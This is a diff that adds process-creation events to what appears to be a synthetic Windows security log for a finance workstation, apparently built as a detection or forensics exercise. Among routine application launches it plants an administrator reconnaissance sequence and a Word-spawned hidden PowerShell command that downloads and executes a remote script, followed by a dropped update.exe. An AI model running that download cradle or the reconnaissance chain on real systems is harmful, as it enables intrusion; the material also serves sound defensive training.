@@ -29,6 +29,19 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.34
 "
+"2026-03-02T08:40:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
 "2026-03-02T08:40:39Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
 Subject:
@@ -43,6 +56,32 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.46
+"
+"2026-03-02T08:42:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
+"2026-03-02T08:45:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
 "
 "2026-03-02T08:48:55Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
@@ -424,6 +463,97 @@ Network Information:
 Subject:
 	Account Name:		administrator
 "
+"2026-03-02T09:17:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\whoami.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	whoami /all
+"
+"2026-03-02T09:17:25Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\net.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	net user
+"
+"2026-03-02T09:17:50Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\net.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	net localgroup administrators
+"
+"2026-03-02T09:18:15Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\ipconfig.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	ipconfig /all
+"
+"2026-03-02T09:18:40Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\systeminfo.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	systeminfo
+"
+"2026-03-02T09:19:05Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		administrator
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\nltest.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	nltest /domain_trusts
+"
+"2026-03-02T09:34:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
 "2026-03-02T09:35:13Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
 Subject:
@@ -470,6 +600,19 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.25
 "
+"2026-03-02T09:50:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
 "2026-03-02T09:51:15Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
 Subject:
@@ -484,6 +627,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.32
+"
+"2026-03-02T09:54:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
 "
 "2026-03-02T09:54:01Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
@@ -515,6 +671,19 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.68
 "
+"2026-03-02T10:13:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
 "2026-03-02T10:15:59Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
 Subject:
@@ -544,6 +713,71 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.76
+"
+"2026-03-02T10:30:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Creator Process Name:	C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+	Process Command Line:	powershell.exe -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.20/a.ps1')""
+"
+"2026-03-02T10:30:40Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Users\Public\update.exe
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	C:\Users\Public\update.exe
+"
+"2026-03-02T10:31:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
+"2026-03-02T10:32:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		rgarcia
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
+"2026-03-02T10:38:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		asmith
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
 "
 "2026-03-02T10:39:13Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
@@ -638,6 +872,19 @@ Failure Information:
 Network Information:
 	Source Network Address:	198.51.100.7
 "
+"2026-03-02T11:01:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
 "2026-03-02T11:01:00Z","4625","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account failed to log on.
 
 Subject:
@@ -718,6 +965,19 @@ Failure Information:
 Network Information:
 	Source Network Address:	198.51.100.7
 "
+"2026-03-02T11:03:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
 "2026-03-02T11:04:00Z","4740","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A user account was locked out.
 
 Subject:
@@ -740,6 +1000,32 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.35
+"
+"2026-03-02T11:17:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
+"2026-03-02T11:28:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
 "
 "2026-03-02T11:29:42Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
@@ -770,6 +1056,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.66
+"
+"2026-03-02T11:53:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		asmith
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
 "
 "2026-03-02T11:58:55Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
@@ -816,6 +1115,32 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.51
 "
+"2026-03-02T12:14:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
+"2026-03-02T12:15:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
 "2026-03-02T12:29:32Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
 Subject:
@@ -830,6 +1155,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.52
+"
+"2026-03-02T12:45:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		jdoe
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
 "
 "2026-03-02T13:00:53Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
@@ -967,6 +1305,19 @@ Network Information:
 Subject:
 	Account Name:	administrator
 "
+"2026-03-02T14:05:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\ipconfig.exe
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	ipconfig /all
+"
 "2026-03-02T14:07:54Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
 Subject:
@@ -996,6 +1347,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.42
+"
+"2026-03-02T14:18:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		rgarcia
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
 "
 "2026-03-02T14:18:18Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
@@ -1118,6 +1482,19 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.44
 "
+"2026-03-02T15:17:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		rgarcia
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+"
 "2026-03-02T15:21:22Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
 Subject:
@@ -1132,6 +1509,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.46
+"
+"2026-03-02T15:32:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		rgarcia
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
 "
 "2026-03-02T15:50:29Z","4625","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account failed to log on.
 
@@ -1164,6 +1554,19 @@ New Logon:
 Network Information:
 	Source Network Address:	10.0.0.79
 "
+"2026-03-02T15:51:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""
+"
 "2026-03-02T15:59:33Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
 Subject:
@@ -1178,6 +1581,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.55
+"
+"2026-03-02T16:01:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		asmith
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
 "
 "2026-03-02T16:04:51Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
@@ -1223,6 +1639,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.68
+"
+"2026-03-02T16:20:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		mlee
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
 "
 "2026-03-02T16:20:01Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
@@ -1343,6 +1772,19 @@ New Logon:
 
 Network Information:
 	Source Network Address:	10.0.0.29
+"
+"2026-03-02T17:33:00Z","4688","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","A new process has been created.
+
+Creator Subject:
+	Account Name:		kpatel
+
+Target Subject:
+	Account Name:		-
+
+Process Information:
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
 "
 "2026-03-02T17:34:34Z","4624","Microsoft-Windows-Security-Auditing","Information","WS-FINANCE01.corp.example","An account was successfully logged on.
 
